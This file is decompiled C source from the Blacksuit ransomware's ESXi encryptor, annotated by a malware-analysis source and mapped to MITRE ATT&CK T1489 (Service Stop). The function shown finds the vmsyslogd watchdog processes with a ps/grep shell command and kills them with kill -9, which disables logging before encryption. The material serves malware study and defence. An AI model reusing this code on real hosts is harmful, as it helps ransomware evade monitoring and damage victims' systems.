////////////////////////////////////////////////////////////
// Blacksuit Encryptor
// https://www.shadowstackre.com/analysis/blacksuit-ransomware-esxi
// 
// Technique: Service Stop 
// URL: https://attack.mitre.org/techniques/T1489/
//
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////

// Kill the VM watch dog processes
void kill_vmsyslog(void)
{
  char v0[1024]; // [rsp+0h] [rbp-8E0h] BYREF
  char procToKill[512]; // [rsp+400h] [rbp-4E0h] BYREF
  char procToKill1[512]; // [rsp+600h] [rbp-2E0h] BYREF
  struct stat stateBuffer; // [rsp+800h] [rbp-E0h] BYREF
  __pid_t pidID; // [rsp+898h] [rbp-48h]
  int fileDesc; // [rsp+89Ch] [rbp-44h]
  void *ptrFileBuffer; // [rsp+8A0h] [rbp-40h]
  char *ptrStrIndex; // [rsp+8A8h] [rbp-38h]
  char *v8; // [rsp+8B0h] [rbp-30h]
  int strLen1; // [rsp+8BCh] [rbp-24h]
  char *v10; // [rsp+8C0h] [rbp-20h]
  int strLen2; // [rsp+8CCh] [rbp-14h]

  pidID = fork();                               // Create a new child process
  if ( !pidID )
  {
    // Execute the command for 'ps -Cc' and 
    // pipe the results to 'grep'.  Searching 
    // for the string "vmsyslogd".  The result
    // is redirected to a file called 'PS_syslog_'.
    execlp("/bin/sh", "/bin/sh", "-c", "ps -Cc|grep vmsyslogd > PS_syslog_", 0LL);
    exit(0);
  }
  // Wait for a state change in any child
  // process whose process group ID is equal
  // to that of the calling process
  wait(0LL);
  fileDesc = open("PS_syslog_", 0);
  if ( fileDesc != -1 )                         // File exist and was opened
  {
    memset(&stateBuffer, 0, sizeof(stateBuffer));
    stat("PS_syslog_", &stateBuffer);
    if ( stateBuffer.st_size && (ptrFileBuffer = malloc(stateBuffer.st_size)) != 0LL )
    {
      // read the file upto the stateBuffer.st_size (size of file) in plain text. 
      // Store the contents in the ptrFileBuffer
      if ( (unsigned __int8)read_all(fileDesc, (unsigned __int8 *)ptrFileBuffer, stateBuffer.st_size) != 1 )
      {
        close(fileDesc);
        free(ptrFileBuffer);
      }
      else
      {
        memset(procToKill1, 0, sizeof(procToKill1));
        memset(procToKill, 0, sizeof(procToKill));
        ptrStrIndex = (char *)ptrFileBuffer;
        // search for string 'wdog' in the file contents. Get
        // A pointer to the first index matching
        ptrStrIndex = strstr((const char *)ptrFileBuffer, "wdog");
        if ( ptrStrIndex )
        {
          while ( *ptrStrIndex != 10 )
            --ptrStrIndex;
          v8 = ++ptrStrIndex;
          strLen1 = 0;
          while ( *v8 != 32 )
          {
            ++v8;
            ++strLen1;
          }
          memset(procToKill1, 0, sizeof(procToKill1));
          memcpy(procToKill1, ptrStrIndex, strLen1);
          ptrStrIndex = (char *)ptrFileBuffer;
          ptrStrIndex = strstr((const char *)ptrFileBuffer, "wdog-");
          // Find the processes will 'wdog-'. Then obtain the
          // ID and kill the process using the 'kill' command
          // and signal 9 (SIGKILL).
          if ( ptrStrIndex )
          {
            ptrStrIndex += 5;
            v10 = strstr(ptrStrIndex, " ");
            strLen2 = (_DWORD)v10 - (_DWORD)ptrStrIndex;
            memset(procToKill, 0, sizeof(procToKill));
            memcpy(procToKill, ptrStrIndex, strLen2);
            memset(v0, 0, sizeof(v0));
            sprintf(v0, "kill -9 %s", procToKill1);
            logs::print((logs *)"kill -9 %s", procToKill1);
            pidID = fork();
            if ( !pidID )
            {
              execlp("/bin/sh", "/bin/sh", "-c", v0, 0LL);
              exit(0);
            }
            wait(0LL);
            memset(v0, 0, sizeof(v0));
            sprintf(v0, "kill -9 %s", procToKill);
            logs::print((logs *)"kill -9 %s", procToKill);
            pidID = fork();
            if ( !pidID )
            {
              execlp("/bin/sh", "/bin/sh", "-c", v0, 0LL);
              exit(0);
            }
            wait(0LL);
          }
        }
      }
    }
    else
    {
      close(fileDesc);
    }
  }
}